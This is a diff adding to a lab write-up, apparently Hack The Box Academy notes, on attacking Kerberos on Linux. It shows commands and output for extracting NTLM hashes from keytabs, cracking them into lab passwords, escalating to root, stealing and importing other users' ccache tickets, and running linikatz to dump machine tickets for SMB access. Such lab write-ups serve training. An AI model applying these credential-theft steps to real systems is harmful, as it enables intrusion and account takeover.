@@ -822,5 +822,313 @@ smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home
 Also, we can see the .kt of svc user, so... now, we need extrat the NTML again -->
 
 ```
-// Some code
+carlos@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
+
+[!] No RC4-HMAC located. Unable to extract NTLM hashes.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : svc_workstations/
+	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
+```
+
+But... it isnt he NTML hash... so, read al directorio of scripts -->
+
+```
+carlos@inlanefreight.htb@linux01:~/.scripts$ ls -la
+total 24
+drwx------ 2 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Dec 26 14:00 .
+drwx---r-x 6 carlos@inlanefreight.htb domain users@inlanefreight.htb 4096 Dec 26 13:41 ..
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  146 Oct  6  2022 john.keytab
+-rwx------ 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  251 Oct  6  2022 kerberos_script_test.sh
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb  246 Dec 26 14:00 svc_workstations._all.kt
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb   94 Dec 26 14:00 svc_workstations.kt
+carlos@inlanefreight.htb@linux01:~/.scripts$ 
+
+```
+
+We can see the john.keytab, so... do the keytab extract -->
+
+```
+carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/john.keytab
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[!] Unable to identify any AES128-CTS-HMAC-SHA1 hashes.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : john/
+	NTLM HASH : c4b0e1b10c7ce2c4723b4e2407ef81a2
+	AES-256 HASH : 9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
+
+```
+
+Pass it to crackstation and obtain the clear password and make a escalation -->
+
+<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+`john : Password3`
+
+And exist anothers file that we can make the keytab extaction -->
+
+```
+carlos@inlanefreight.htb@linux01:~/.scripts$ python3 /opt/keytabextract.py /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt 
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : INLANEFREIGHT.HTB
+	SERVICE PRINCIPAL : svc_workstations/
+	NTLM HASH : 7247e8d4387e76996ff3f18a34316fdd
+	AES-256 HASH : 0c91040d4d05092a3d545bbf76237b3794c456ac42c8d577753d64283889da6d
+	AES-128 HASH : 3a7e52143531408f39101187acc80677
+carlos@inlanefreight.htb@linux01:~/.scripts$ 
+
+```
+
+<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+`svc_workstations : Password4`
+
+```
+carlos@inlanefreight.htb@linux01:~$ su - svc_workstations@inlanefreight.htb
+Password: 
+svc_workstations@inlanefreight.htb@linux01:~$ 
+```
+
+* Check the sudo privileges of the svc\_workstations user and get access as root. Submit the flag in /root/flag.txt directory as the response.
+
+```
+svc_workstations@inlanefreight.htb@linux01:~$ sudo -l
+[sudo] password for svc_workstations@inlanefreight.htb: 
+Matching Defaults entries for svc_workstations@inlanefreight.htb on linux01:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_workstations@inlanefreight.htb may run the following commands on linux01:
+    (ALL) ALL
+svc_workstations@inlanefreight.htb@linux01:~$ sudo su
+root@linux01:/home/svc_workstations@inlanefreight.htb# cd /root/
+root@linux01:~# ls
+flag.txt  snap
+root@linux01:~# cat flag.txt 
+Ro0t_Pwn_K3yT4b
+root@linux01:~# 
+
+```
+
+* Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \DC01\julio.
+
+<figure><img src="../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+```
+root@linux01:/tmp# klist
+Ticket cache: FILE:/tmp/krb5cc_647401109_euaagv
+Default principal: svc_workstations@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 14:18:03  12/27/2025 00:18:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 14:18:03
+
+root@linux01:/tmp# cp krb5cc_647401106_HRJDux /root/
+root@linux01:/tmp# cp krb5cc_647401106_iX0aj1 /root/
+root@linux01:/tmp# cd /root/
+root@linux01:~# ls
+flag.txt  krb5cc_647401106_HRJDux  krb5cc_647401106_iX0aj1  snap
+
+root@linux01:~# export KRB5CCNAME=/root/krb5cc_647401106_iX0aj1
+
+root@linux01:~# klist
+Ticket cache: FILE:/root/krb5cc_647401106_iX0aj1
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 15:08:25  12/27/2025 01:08:25  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:08:25
+```
+
+```
+root@linux01:~# smbclient //dc01/julio/
+Enter julio@INLANEFREIGHT.HTB's password: 
+Try "help" to get a list of possible commands.
+
+smb: \> ls
+  .                                   D        0  Thu Jul 14 12:25:24 2022
+  ..                                  D        0  Thu Jul 14 12:25:24 2022
+  julio.txt                           A       17  Thu Jul 14 21:18:12 2022
+
+		7706623 blocks of size 4096. 4459013 blocks available
+smb: \> get julio.txt 
+getting file \julio.txt of size 17 as julio.txt (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)
+
+smb: \> exit
+root@linux01:~# cat julio.txt 
+```
+
+* Use the LINUX01$ Kerberos ticket to read the flag found in \DC01\linux01. Submit the contents as your response (the flag starts with Us1nG\_).
+
+I will use the linikatz.sh -->
+
+```
+root@linux01:~# /opt/linikatz.sh
+ _ _       _ _         _
+| (_)_ __ (_) | ____ _| |_ ____
+| | | '_ \| | |/ / _` | __|_  /
+| | | | | | |   < (_| | |_ / /
+|_|_|_| |_|_|_|\_\__,_|\__/___|
+
+             =[ @timb_machine ]=
+
+I: [freeipa-check] FreeIPA AD configuration
+-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Vendor-Firmware-Service
+-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Linux-Foundation-Firmware
+-rw-r--r-- 1 root root 1702 Mar  4  2020 /etc/pki/fwupd/GPG-KEY-Hughski-Limited
+-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd/LVFS-CA.pem
+-rw-r--r-- 1 root root 2169 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Foundation-Metadata
+-rw-r--r-- 1 root root 959 Mar  4  2020 /etc/pki/fwupd-metadata/GPG-KEY-Linux-Vendor-Firmware-Service
+-rw-r--r-- 1 root root 1679 Mar  4  2020 /etc/pki/fwupd-metadata/LVFS-CA.pem
+I: [sss-check] SSS AD configuration
+-rw------- 1 root root 1609728 Dec 26 15:25 /var/lib/sss/db/timestamps_inlanefreight.htb.ldb
+-rw------- 1 root root 1286144 Dec 26 12:31 /var/lib/sss/db/config.ldb
+-rw------- 1 root root 4154 Dec 26 15:25 /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+-rw------- 1 root root 1609728 Dec 26 15:25 /var/lib/sss/db/cache_inlanefreight.htb.ldb
+-rw------- 1 root root 1286144 Oct  4  2022 /var/lib/sss/db/sssd.ldb
+-rw-rw-r-- 1 root root 10406312 Dec 26 15:25 /var/lib/sss/mc/initgroups
+-rw-rw-r-- 1 root root 6406312 Dec 26 15:25 /var/lib/sss/mc/group
+-rw-rw-r-- 1 root root 8406312 Dec 26 15:28 /var/lib/sss/mc/passwd
+-rw-r--r-- 1 root root 113 Dec 26 12:31 /var/lib/sss/pubconf/krb5.include.d/localauth_plugin
+-rw-r--r-- 1 root root 40 Dec 26 12:31 /var/lib/sss/pubconf/krb5.include.d/krb5_libdefaults
+-rw-r--r-- 1 root root 15 Dec 26 12:31 /var/lib/sss/pubconf/krb5.include.d/domain_realm_inlanefreight_htb
+-rw-r--r-- 1 root root 12 Dec 26 15:25 /var/lib/sss/pubconf/kdcinfo.INLANEFREIGHT.HTB
+-rw------- 1 root root 504 Oct  6  2022 /etc/sssd/sssd.conf
+I: [vintella-check] VAS AD configuration
+I: [pbis-check] PBIS AD configuration
+I: [samba-check] Samba configuration
+-rw-r--r-- 1 root root 8942 Oct  4  2022 /etc/samba/smb.conf
+-rw-r--r-- 1 root root 8 Jul 18  2022 /etc/samba/gdbcommands
+I: [kerberos-check] Kerberos configuration
+-rw-r--r-- 1 root root 2800 Dec 26 12:31 /etc/krb5.conf
+-rw------- 1 root root 2694 Dec 26 12:32 /etc/krb5.keytab
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1406 Dec 26 15:25 /tmp/krb5cc_647401106_HRJDux
+-rw------- 1 julio@inlanefreight.htb domain users@inlanefreight.htb 1414 Dec 26 15:25 /tmp/krb5cc_647401106_WSJlO9
+-rw------- 1 david@inlanefreight.htb domain users@inlanefreight.htb 1406 Dec 26 14:17 /tmp/krb5cc_647401107_rjUKbm
+-rw------- 1 svc_workstations@inlanefreight.htb domain users@inlanefreight.htb 1535 Dec 26 14:19 /tmp/krb5cc_647401109_euaagv
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 3175 Dec 26 15:27 /tmp/krb5cc_647402606
+-rw------- 1 carlos@inlanefreight.htb domain users@inlanefreight.htb 1433 Dec 26 14:18 /tmp/krb5cc_647402606_ELZUuQ
+I: [samba-check] Samba machine secrets
+I: [samba-check] Samba hashes
+I: [check] Cached hashes
+I: [sss-check] SSS hashes
+/opt/linikatz.sh: line 349: tdbdump: command not found
+I: [check] Machine Kerberos tickets
+I: [sss-check] SSS ticket list
+Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 15:23:25  12/27/2025 01:23:25  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25, Flags: RIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+12/26/2025 15:23:25  12/27/2025 01:23:25  ldap/dc01.inlanefreight.htb@
+	renew until 12/27/2025 15:23:25, Flags: RAO
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+12/26/2025 15:23:25  12/27/2025 01:23:25  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25, Flags: RAO
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+I: [kerberos-check] User Kerberos tickets
+Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+10/07/2022 11:32:01  10/07/2022 21:32:01  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 10/08/2022 11:32:01, Flags: FPRIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647401106_WSJlO9
+Default principal: julio@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 15:23:25  12/27/2025 01:23:25  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25, Flags: FPRIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647401107_rjUKbm
+Default principal: david@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 14:15:39  12/27/2025 00:15:39  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 14:15:39, Flags: FPRIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647401109_euaagv
+Default principal: svc_workstations@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 14:18:03  12/27/2025 00:18:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 14:18:03, Flags: FPRIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647402606
+Default principal: svc_workstations@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 15:23:25  12/27/2025 01:23:25  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25, Flags: FPRIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+12/26/2025 15:25:59  12/27/2025 01:23:25  cifs/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
+	Flags: AO, Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+Ticket cache: FILE:/tmp/krb5cc_647402606_ELZUuQ
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 14:16:26  12/27/2025 00:16:26  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 14:16:26, Flags: FPRIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+I: [check] KCM Kerberos tickets
+/opt/linikatz.sh: line 507: syntax error: unexpected end of file
+root@linux01:~# 
+
+```
+
+We can observe a file that there is linux01 -->
+
+```
+I: [check] Machine Kerberos tickets
+I: [sss-check] SSS ticket list
+Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 15:23:25  12/27/2025 01:23:25  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25, Flags: RIA
+	Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: 
+12/26/2025 15:23:25  12/27/2025 01:23:25  ldap/dc01.inlanefreight.htb@
+	renew until 12/27/2025 15:23:25, Flags: RAO
+```
+
+Now use it -->
+
+```
+root@linux01:~# export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+
+root@linux01:~# klist
+Ticket cache: FILE:/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+Default principal: LINUX01$@INLANEFREIGHT.HTB
+
+Valid starting       Expires              Service principal
+12/26/2025 15:23:25  12/27/2025 01:23:25  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25
+12/26/2025 15:23:25  12/27/2025 01:23:25  ldap/dc01.inlanefreight.htb@
+	renew until 12/27/2025 15:23:25
+12/26/2025 15:23:25  12/27/2025 01:23:25  ldap/dc01.inlanefreight.htb@INLANEFREIGHT.HTB
+	renew until 12/27/2025 15:23:25
+
+```
+
+```
+root@linux01:~# smbclient //dc01/linux01/                                 
+Enter LINUX01$@INLANEFREIGHT.HTB's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Oct  5 14:17:02 2022
+  ..                                  D        0  Wed Oct  5 14:17:02 2022
+  flag.txt                            A       52  Wed Oct  5 14:17:02 2022
+
+		7706623 blocks of size 4096. 4459013 blocks available
+smb: \> get flag.txt 
 ```
